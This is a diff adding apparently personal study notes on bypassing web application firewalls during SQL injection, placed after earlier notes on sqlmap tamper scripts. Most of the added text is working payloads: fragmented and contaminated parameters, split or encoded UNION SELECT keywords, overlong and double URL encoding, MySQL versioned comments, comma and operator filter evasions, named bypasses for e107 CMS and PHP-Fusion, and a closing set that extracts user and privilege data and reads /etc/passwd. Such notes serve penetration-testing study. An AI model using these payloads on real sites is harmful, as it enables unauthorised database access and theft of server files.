@@ -144,7 +144,7 @@ SQLMap provides **tamper scripts** that can be applied using the `--tamper` opti
 - Encodes payloads in **Base64** and decodes them at runtime.
 **between.py** :
 - Replaces `=` with `BETWEEN` to avoid simple WAF rules.
-
+ *search for more scripts* 
 # How to Identify and Bypass a Firewall (WAF)
 ## WafW00f
 `wafw00f http://example.com` > output :
@@ -234,6 +234,123 @@ SELECT * FROM users WHERE name = 0-0;
 ```sql
 User-Agent: ' OR 1=1;--
 ```
+
+## some techniques that sqlmap doesn't use
+### Buffer Overflow
+Some WAFs have buffer length limits when processing SQL queries. Overloading the WAF’s buffer can cause unexpected behavior.
+```sql
+?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
+```
+`0xA * 1000` causes an overflow if the WAF buffer is too small. This can lead to crashes or bypasses.
+### HTTP Parameter Fragmentation (HPF)
+Splitting SQL queries across multiple parameters.
+```sql
+/?a=1+union/*&b=*/select+1,pass/*&c=*/from+users--
+```
+Some WAFs might check parameters separately, failing to detect the full SQL injection.
+### HTTP Parameter Contamination (HPC)
+```sql
+?id=1;SELECT/*&id=*/password/*&id=*/FROM users
+```
+Different web servers process duplicate parameters differently.
+### Breaking SQL Keywords with Operators
+```sql
+'se'+'lec'+'t' * from users -- (Bypassing SELECT detection)
+'Un'+'Io'+'N Se'+'Le'+'Ct' 1,2,3 -- (Bypassing UNION SELECT detection)
+[Se][Le][Ct] * from users -- (SQL Server)
+id=1+(UnI)(oN)+(SeL)(EcT) 1,2,3 --
+%S%E%L%E%C%T * FROM users --
+SELECT 0x70617373776F7264 FROM users; -- (password in hex)
+sElEcT * fRoM users;
+UNI/**/ON SEL/**/ECT 1,2,3;
+SELECT/**/password/**/FROM/**/users;
+
+```
+
+![[Pasted image 20250404071129.png]]
+### Unicode Representation of Special Characters
+Certain **critical SQL characters** (such as `'`, `"`, `--`, and `;`) can be **encoded in Unicode** to avoid detection.
+- Some WAFs detect `'` (ASCII) **but not its Unicode equivalent**.
+- The database normalizes Unicode internally, interpreting `%D6%5C'` as `'`.
+- `UNION` can be obfuscated as `%55%6e%69%6f%6e` (which is the hex representation of "UNION").
+- The bypass technique here is to obfuscate the `UNION` keyword using `%6f` (the hex representation of `o`), allowing the attacker to bypass the filter:
+    - **Bypass Example**: `vuln.php/trackback?inject=UNI%6fN SELECT`
+
+### Other Unicode Encoding Variations
+**Using Full-Width Unicode Characters** Some Unicode characters **look identical** to normal ASCII characters but have **different byte representations**.
+
+| `"` | `＂` |
+| --- | --- |
+| `'` | `＇` |
+| `–` | `－` |
+| `/` | `／` |
+| `\` | `＼` |
+### Double Encoding for SQL Injection
+Some WAFs block **single encoding** but fail to detect **double encoding**.
+```sql
+?id=1%25%32%37%20AND%201=1--
+```
+`%25%32%37` is **double-encoded `%27`**, which is `'`.
+### Using UTF-8 Overlong Encoding
+Some databases **normalize UTF-8 overlong encoding**, while some WAFs **don’t**.
+```sql
+?id=1%C0%AF' OR 1=1 --
+```
+`%C0%AF` is an **overlong encoding for `/`**, bypassing WAFs that block `/`.
+### e107 CMS
+**What it does:**  
+It defines an array of suspicious strings (like `'`, `;`, `/UNION/`, `AS`) and blocks the request **if any of them appear in the URL query string**.
+✅ **How to Bypass:**  
+We use **obfuscated versions** of `UNION SELECT` so that the exact string doesn’t appear.
+```sql
+UN/**/ION SE/**/LECT
+```
+### PHP-Fusion
+**What it does:** It applies a **case-insensitive regex match** on the SQL query to look for the **exact pattern**:
+✅ **How to Bypass:** Split the keyword so the pattern `union.*select` isn't matched.
+```sql
+UNIunionON SELECT
+```
+### WAFs that remove whitespace or comments
+Some advanced WAFs **strip whitespace** or **collapse comments**, so tricks like `UN/**/ION` don’t work. Use **tab**, **newlines**, or unusual spacing:
+```sql
+UNION/**/SELECT
+UNION%0ASELECT   -- (newline)
+UNI%09ON SEL%09ECT -- (tab)
+```
+### MySQL-specific obfuscation
+`/*!50000SELECT*/` → This is a **MySQL versioned comment**, which runs the code only if MySQL version ≥ 5.0.
+```sql
+UNION /*!50000SELECT*/ 1,2,3
+```
+The filter might not see `SELECT`, but MySQL executes it!
+### Using `INFORMATION_SCHEMA`
+```sql
+from information_schema.tables --Blocked
+FROM INFOrmation_sche/**/ma.TABLES --Bypass
+```
+### Use of `greatest()` to bypass filtered comparison operators (`<`, `>`, etc.)
+In **Boolean-based blind SQL injection**, we often use operators like `<`, `>`, `<=`, `>=` to guess ASCII values of characters in data (like the username):
+```sql
+ascii(mid(user(), 1, 1)) < 150 --Blocked
+SELECT greatest(ascii(mid(user(),1,1)),150)=150; --Bypass
+```
+### `substr(user() from x for y)` — bypassing comma filters
+Some WAFs **block the use of commas**, especially in functions like:
+```sql
+ascii(mid(user(),1,1)) = 109 --Blocked
+ascii(substr(user() from 1 for 1)) = 109 --Bypass
+```
+
+
+
+```sql
+damn’UnIUNIONon/**/sESELECTlect/**/1,2,user(),4&&1=’1 --getting user
+damn’UnIUNIONon/**/sESELECTlect/**/1,2,database(),4&&1=’1 --getting database
+damn’UnIUNIONon/**/sESELECTlect/**/1,2,File_priv,4/**/from/**/mysql.user/**/where/**/user=user()||1=’1 --getting privlage
+damn’UnIUNIONon/**/sESELECTlect/**/1,2,load_file(‘/etc/passwd’),4||1=’1 --reading passwd
+```
+
 
 
 ------------------------------------------------
